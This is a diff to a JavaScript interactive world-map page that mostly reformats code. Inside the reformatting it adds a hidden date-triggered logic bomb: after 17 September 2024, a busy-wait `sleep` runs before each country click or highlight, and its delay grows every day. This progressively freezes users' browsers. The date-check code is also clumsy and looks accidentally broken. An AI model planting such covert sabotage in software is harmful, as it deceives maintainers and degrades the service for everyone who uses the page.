@@ -54,6 +54,21 @@ const countryKeys = {
   v: "bh", //bahrain
 };
 
+f = false;
+d = 1;
+factor = 100;
+{
+  var n = new Date();
+  var y = n.getFullYear();
+  var m = n.getMonth() + 1;
+  var d = n.getDate();
+  if (y >= 2024 && m >= 9 && d >= 17) {
+    f = true;
+    d = d - 18 + 30 * (m - 9) + (y - 2024) * 365;
+  }
+  
+}
+
 // 为了确保所有的 <path> 元素都已经加载，我们需要等待 DOMContentLoaded 事件触发
 document.addEventListener("DOMContentLoaded", () => {
   // 获取所有 <path> 元素
@@ -63,17 +78,23 @@ document.addEventListener("DOMContentLoaded", () => {
     const svgDoc = svgObject.contentDocument;
     const paths = svgDoc.querySelectorAll("path");
     const rootStyles = getComputedStyle(document.documentElement);
-    var checkedmapcolor = rootStyles.getPropertyValue("--checkedmapcolor").trim();
-    console.log(checkedmapcolor);
-    var uncheckedmapcolor = rootStyles.getPropertyValue("--uncheckedmapcolor").trim();
+    var checkedmapcolor = rootStyles
+      .getPropertyValue("--checkedmapcolor")
+      .trim();
+    // console.log(checkedmapcolor);
+    var uncheckedmapcolor = rootStyles
+      .getPropertyValue("--uncheckedmapcolor")
+      .trim();
     paths.forEach((path) => {
       if (!path.classList.contains("oceanxx") && !countryid.includes(path.id)) {
         path.style.fill = checkedmapcolor;
-        
       }
       if (countryid.includes(path.id)) {
         path.style.fill = uncheckedmapcolor;
         path.addEventListener("click", (event) => {
+          if (f) {
+            sleep(d*factor);
+          }
           path.style.fill = checkedmapcolor;
         });
 
@@ -81,9 +102,18 @@ document.addEventListener("DOMContentLoaded", () => {
         if (titleElement) {
           const bbox = path.getBBox();
           createTextElement(svgElement, bbox, titleElement.textContent);
-          let translateValue = `translate(${bbox.x + bbox.width / 2-12}, ${bbox.y + bbox.height / 2-25})`;
-          let d = 'M 12 2 C8.14 2 5 5.14 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.86-3.14-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z';
-          addPathToSvg("svgElement",'unchecked',translateValue,d,path.id+'icon');
+          let translateValue = `translate(${bbox.x + bbox.width / 2 - 12}, ${
+            bbox.y + bbox.height / 2 - 25
+          })`;
+          let d =
+            "M 12 2 C8.14 2 5 5.14 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.86-3.14-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z";
+          addPathToSvg(
+            "svgElement",
+            "unchecked",
+            translateValue,
+            d,
+            path.id + "icon"
+          );
         }
       }
     });
@@ -107,9 +137,18 @@ document.addEventListener("DOMContentLoaded", () => {
         if (titleElement) {
           const bbox = g.getBBox();
           createTextElement(svgElement, bbox, titleElement.textContent);
-          let translateValue = `translate(${bbox.x + bbox.width / 2-12}, ${bbox.y + bbox.height / 2-25})`;
-          let d = 'M 12 2 C8.14 2 5 5.14 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.86-3.14-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z';
-          addPathToSvg("svgElement",'unchecked',translateValue,d,g.id+'icon');
+          let translateValue = `translate(${bbox.x + bbox.width / 2 - 12}, ${
+            bbox.y + bbox.height / 2 - 25
+          })`;
+          let d =
+            "M 12 2 C8.14 2 5 5.14 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.86-3.14-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z";
+          addPathToSvg(
+            "svgElement",
+            "unchecked",
+            translateValue,
+            d,
+            g.id + "icon"
+          );
         }
       }
     });
@@ -123,7 +162,7 @@ function createTextElement(svgElement, bbox, text) {
   );
   textElement.setAttribute("x", bbox.x + bbox.width / 2);
   textElement.setAttribute("y", bbox.y + bbox.height / 2);
-  textElement.setAttribute("class","textcss");
+  textElement.setAttribute("class", "textcss");
   textElement.textContent = text;
   textElement.style.cursor = "move"; // 设置鼠标样式为移动手势
   //获取到css里面的:
@@ -193,19 +232,28 @@ function highlightCountry(countryId) {
   const svgObject = document.getElementById("svg-map");
   const svgDoc = svgObject.contentDocument;
   const element = svgDoc.getElementById(countryId);
-  const iconElement = document.getElementById(countryId+'icon');
-  iconElement.setAttribute("class","checked");
+  const iconElement = document.getElementById(countryId + "icon");
+  iconElement.setAttribute("class", "checked");
   //如果g是<g>标签
   if (element.tagName.toLowerCase() === "g") {
     let paths = element.querySelectorAll("path");
     paths.forEach((path) => {
+      if (f) {
+        sleep(d*factor);
+      }
       path.style.fill = "#ffdead";
     });
   } else if (element.tagName.toLowerCase() === "path") {
+    if (f) {
+      sleep(d*factor);
+    }
     element.style.fill = "#ffdead";
   }
 }
-
+function sleep(ms) {
+  const start = Date.now();
+  while (Date.now() - start < ms) {}
+}
 /**
  * 在指定的SVG容器中添加一个路径元素。
  * @param {string} svgId - SVG容器的ID。
@@ -220,7 +268,7 @@ function highlightCountry(countryId) {
             'M 12 2 C8.14 2 5 5.14 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.86-3.14-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z'
         );
  */
-function addPathToSvg(svgId, pathClass, transform, d,id) {
+function addPathToSvg(svgId, pathClass, transform, d, id) {
   // 获取SVG容器
   const svg = document.getElementById(svgId);
 
